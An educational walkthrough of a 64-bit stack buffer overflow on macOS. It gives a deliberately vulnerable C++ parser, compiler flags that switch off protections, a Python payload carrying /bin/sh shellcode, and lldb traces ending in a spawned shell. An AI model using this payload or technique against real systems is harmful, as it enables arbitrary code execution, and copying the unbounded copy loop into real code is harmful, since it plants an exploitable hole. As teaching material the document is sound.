# A simple buffer overflow exmple

 To demonstrate how a simple buffer overflow works, I've takes code from the fuzzing slides:

```C++
void copy_lower (char* in, char* out){
	int i = 0;
	while (in[i] != '\n') {
		out[i] = in[i];
		i++;
	}
	out[i] = '\0';
}

void allocate(char* in){
	char buf[5];
	copy_lower(in, buf);
	printf("%p\n", buf);	
}

int parse(FILE *fp) {
	char cmd[128], *url;
	fread(cmd, sizeof(char), 128, fp);
	int header_ok = 0;
	printf("received input %s",cmd);
        
  if(cmd[0] == 'G')
		if(cmd[1] == 'E')
			if(cmd[2] == 'T')
				if(cmd[3] == ' ')
					header_ok = 1;
	if (!header_ok) {
		printf("wrong header\n");
		return -1;
	}
	url = cmd + 4;
	allocate(url);
	return 0;
}

int main(int argc, char* argv[]){
   FILE *fp;
   fp = fopen(argv[1], "r");
   if(fp == NULL){ printf("error opening file\n"); return 0; }
   parse(fp);   
   fclose(fp);
   return 1;
}
```

This is supposed to be a simple parser, requiring first the sequence "GET " and then some text. I have made some modifications in order for the buffer overflow to work as planned, these are:

* creating an allocate() function, that allocates the buf[] buffer. This avoids overwriting the cmd buffer whilst performing the overflow, creating a big mess.
* removing the actual call to tolower(), which would make all characters put ino the buffer lowercase, destroying our shellcode.
* removing the condition to break on '\0' from line 8, which creates a problem when \x00 occurs in the cmd buffer, stopping the overflow before finishing writing the shellcode.
* printing the pointer value (line 25)

I compile this on my 64bit mac using clang:

```
$ g++ -fno-stack-protector -Wl,-no_pie -Wl,-allow_stack_execute -g test.cpp
```

The compiler flags are there to remove stack protection (detection of overflows), address randomization (not knowing where the shellcode is written), and allowing executing code located on the stack (why would anyone want that?). Without these flags, it would be much harder to create a working overflow.

We also need input to send to the resulting binary that triggers the overflow, basically a long string, writing over the bounds of the char buf[5] buffer, until it reaches the return pointer on the stack, which contains the memory location of the code that should be executed once the call to allocate has finished.

I use a Python script:

```Python
print "GET " + "A"*21 + "\x00\x00\x7f\xff\x5f\xbf\xf9\x50"[::-1] + "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
```

which writes 21 A charactes (0x41), followed by a 64bit memory location, and shellcode that is supposed to provide me with a shell (taken from http://shell-storm.org/shellcode/files/shellcode-736.php).

The goal of the overflow is to overwrite the return pointer of the allocate function and make it point to the location of the first byte of the shellcode. Let's start a debugger to investigate the memory before and after calling the copy_lower (which overwrites the memory) function:

```
$ python test.py > test_gdb.txt
$ lldb a.out
```

```
(lldb) target create "a.out"
Current executable set to 'a.out' (x86_64).
(lldb) breakpoint set -l 4
Breakpoint 1: where = a.out`copy_lower(char*, char*) + 12 at test.cpp:5, address = 0x0000000100000cdc
(lldb) breakpoint set -l 11
Breakpoint 2: where = a.out`copy_lower(char*, char*) + 88 at test.cpp:11, address = 0x0000000100000d28
(lldb) run test_gdb.txt
Process 40036 launched: '/Users/sicco/Dropbox/buffer_overflow_test/a.out' (x86_64)
Process 40036 stopped
* thread #1: tid = 0x16b64e, 0x0000000100000cdc a.out`copy_lower(in="AAAAAAAAAAAAAAAAAAAAAP??_?, out="") + 12 at test.cpp:5, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000100000cdc a.out`copy_lower(in="AAAAAAAAAAAAAAAAAAAAAP??_?, out="") + 12 at test.cpp:5
   2   	#include <stdio.h>
   3   	
   4   	void copy_lower (char* in, char* out){
-> 5   		int i = 0;
   6   		while (in[i] != '\n') {
   7   			out[i] = in[i];
   8   			i++;
(lldb) bt
* thread #1: tid = 0x16b64e, 0x0000000100000cdc a.out`copy_lower(in="AAAAAAAAAAAAAAAAAAAAAP??_?, out="") + 12 at test.cpp:5, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x0000000100000cdc a.out`copy_lower(in="AAAAAAAAAAAAAAAAAAAAAP??_?, out="") + 12 at test.cpp:5
    frame #1: 0x0000000100000d49 a.out`allocate(in="AAAAAAAAAAAAAAAAAAAAAP??_?) + 25 at test.cpp:15
    frame #2: 0x0000000100000e80 a.out`parse(fp=0x00007fff7666a050) + 272 at test.cpp:35
    frame #3: 0x0000000100000f02 a.out`main(argc=2, argv=0x00007fff5fbffa70) + 98 at test.cpp:43
    frame #4: 0x00007fff96f4a5ad libdyld.dylib`start + 1
(lldb) 
```

The first breakpoint is reached, and I print the backtrace. This gives us info on the return pointers: 0x0000000100000f02 should be the value of the return pointer of parse(), 0x0000000100000e80 of allocate, and 0x0000000100000d49 of copy_lower. These addresses are the points where the calling functions' code continues. Let's try to find these in the stack:

```
(lldb) x/40xg $rsp
0x7fff5fbff910: 0x00007fff5fbff940 0x0000000100000d49 <--
0x7fff5fbff920: 0x0700832569bf80d2 0x0000000000000000
0x7fff5fbff930: 0x0000000000000000 0x00007fff5fbff984
0x7fff5fbff940: 0x00007fff5fbffa10 0x0000000100000e80 <--
0x7fff5fbff950: 0x0700832569bf80d2 0x0000002e00000000
0x7fff5fbff960: 0x0000000000000055 0x00007fff7666a050
0x7fff5fbff970: 0x000000015fbff9e0 0x00007fff5fbff984
0x7fff5fbff980: 0x4141414120544547 0x4141414141414141
0x7fff5fbff990: 0x4141414141414141 0x007fff5fbff95041
0x7fff5fbff9a0: 0x18e0c14902b04100 0x894cff3117c88349
0x7fff5fbff9b0: 0x83495f12eb050fc0 0xd23148c0894c24c0
0x7fff5fbff9c0: 0xe8050fe689485752 0x6e69622fffffffe9
0x7fff5fbff9d0: 0x0000000a68732f2f 0x00007fff5fbffbe8
0x7fff5fbff9e0: 0x00007fff5fbffa10 0x00007fff8b339741
0x7fff5fbff9f0: 0x0000000000000f98 0x0000000000000000
0x7fff5fbffa00: 0x00007fff7666a050 0x0000000000000000
0x7fff5fbffa10: 0x00007fff5fbffa50 0x0000000100000f02 <--
0x7fff5fbffa20: 0x0000000000000000 0x0000000000000000
0x7fff5fbffa30: 0x0000000000000000 0x00007fff7666a050
0x7fff5fbffa40: 0x00007fff5fbffa70 0x0000000000000002
```

rsp is the extended (64bit) stack pointer and I print the 40 memory values above this address. We can clearly see the return pointer values. We can also see the cmd buffer due to all the 0x41 values. After calling the function, the stack looks as follows:

```
(lldb) continue
Process 40036 resuming
Process 40036 stopped
* thread #1: tid = 0x16b64e, 0x0000000100000d28 a.out`copy_lower(in="AAAAAAAAAAAAAAAAAAAAAP??_?, out="AAAAAAAAAAAAAAAAAAAAAP??_?) + 88 at test.cpp:11, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1
    frame #0: 0x0000000100000d28 a.out`copy_lower(in="AAAAAAAAAAAAAAAAAAAAAP??_?, out="AAAAAAAAAAAAAAAAAAAAAP??_?) + 88 at test.cpp:11
   8   			i++;
   9   		}
   10  		out[i] = '\0';
-> 11  	}
   12  	
   13  	void allocate(char* in){
   14  		char buf[5];
(lldb) x/40xg $rsp
0x7fff5fbff910: 0x00007fff5fbff940 0x0000000100000d49 <--
0x7fff5fbff920: 0x0700832569bf80d2 0x0000000000000000
0x7fff5fbff930: 0x4141414141000000 0x4141414141414141
0x7fff5fbff940: 0x4141414141414141 0x00007fff5fbff950 <-- !!
0x7fff5fbff950: 0x4918e0c14902b041 0xc0894cff3117c883
0x7fff5fbff960: 0xc083495f12eb050f 0x52d23148c0894c24
0x7fff5fbff970: 0xe9e8050fe6894857 0x2f6e69622fffffff
0x7fff5fbff980: 0x414141410068732f 0x4141414141414141
0x7fff5fbff990: 0x4141414141414141 0x007fff5fbff95041
0x7fff5fbff9a0: 0x18e0c14902b04100 0x894cff3117c88349
0x7fff5fbff9b0: 0x83495f12eb050fc0 0xd23148c0894c24c0
0x7fff5fbff9c0: 0xe8050fe689485752 0x6e69622fffffffe9
0x7fff5fbff9d0: 0x0000000a68732f2f 0x00007fff5fbffbe8
0x7fff5fbff9e0: 0x00007fff5fbffa10 0x00007fff8b339741
0x7fff5fbff9f0: 0x0000000000000f98 0x0000000000000000
0x7fff5fbffa00: 0x00007fff7666a050 0x0000000000000000
0x7fff5fbffa10: 0x00007fff5fbffa50 0x0000000100000f02 <--
0x7fff5fbffa20: 0x0000000000000000 0x0000000000000000
0x7fff5fbffa30: 0x0000000000000000 0x00007fff7666a050
0x7fff5fbffa40: 0x00007fff5fbffa70 0x0000000000000002
(lldb) 
```

Notice that the 0x0000000100000e80 return pointer is no longer there. The A's have been written in buf, overflowing the buffer, continuing to write and just at the right point the memory location 0x00007fff5fbff950 is written over the existing return pointer value. As you can see, 0x00007fff5fbff950 is an address on the stack, and by magical coincidence exactly the location where the shellcode is written to memory. It is in fact 0x7fff5fbff933 (the address printed below) plus 29 (21 A's and a length 8 memory location, as printed by the python script) Let us see what happens when we continue to step through the code after the allocate function returns:

```
(lldb) breakpoint set -l 17
Breakpoint 3: where = a.out`allocate(char*) + 43 at test.cpp:17, address = 0x0000000100000d5b
(lldb) continue
Process 40036 resuming
received input GET AAAAAAAAAAAAAAAAAAAAAP??_?0x7fff5fbff933
Process 40036 stopped
* thread #1: tid = 0x16b64e, 0x0000000100000d5b a.out`allocate(in="") + 43 at test.cpp:17, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1
    frame #0: 0x0000000100000d5b a.out`allocate(in="") + 43 at test.cpp:17
   14  		char buf[5];
   15  		copy_lower(in, buf);
   16  		printf("%p\n", buf);	
-> 17  	}
   18  	
   19  	int parse(FILE *fp) {
   20  		char cmd[128], *url;
(lldb) step
Process 40036 stopped
* thread #1: tid = 0x16b64e, 0x00007fff5fbff950, queue = 'com.apple.main-thread', stop reason = step in
    frame #0: 0x00007fff5fbff950
->  0x7fff5fbff950: movb   $0x2, %r8b
    0x7fff5fbff953: shlq   $0x18, %r8
    0x7fff5fbff957: orq    $0x17, %r8
    0x7fff5fbff95b: xorl   %edi, %edi
(lldb) step
Process 40036 stopped
* thread #1: tid = 0x16b64e, 0x00007fff5fbff953, queue = 'com.apple.main-thread', stop reason = instruction step into
    frame #0: 0x00007fff5fbff953
->  0x7fff5fbff953: shlq   $0x18, %r8
    0x7fff5fbff957: orq    $0x17, %r8
    0x7fff5fbff95b: xorl   %edi, %edi
    0x7fff5fbff95d: movq   %r8, %rax
(lldb) step
Process 40036 stopped
* thread #1: tid = 0x16b64e, 0x00007fff5fbff957, queue = 'com.apple.main-thread', stop reason = instruction step into
    frame #0: 0x00007fff5fbff957
->  0x7fff5fbff957: orq    $0x17, %r8
    0x7fff5fbff95b: xorl   %edi, %edi
    0x7fff5fbff95d: movq   %r8, %rax
    0x7fff5fbff960: syscall 
...

```

It starts to execute the code we provided. In LLDB, we will not get a shell because it prevents starting one, but we should be able to get one when running it outside of a debugger. We only need to make a small change to the input sequence becaude LLBD (or GDB on Linux) puts some things in memory, messing up the addredd locations. We first run it to find out what we need to change:

```
$ ./a.out test_gdb.txt 
received input GET AAAAAAAAAAAAAAAAAAAAAP??_?0x7fff5fbff9b3
Segmentation fault: 11
```

Giving a segfault, but more importantly the memory address we need. We compute 0x9b3 + 29 = 9D0 (for instance using Google), and modify the input:

```Python
print "GET " + "A"*21 + "\x00\x00\x7f\xff\x5f\xbf\xf9\xD0"[::-1] + "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
```

```
$ python test.py > test_osx.txt
$ ./a.out test_osx.txt
received input GET AAAAAAAAAAAAAAAAAAAAA???_?0x7fff5fbff9b3
sh-3.2$
```



See also https://dl.packetstormsecurity.net/papers/attack/64bit-overflow.pdf, which helped in understanding several encountered issues.



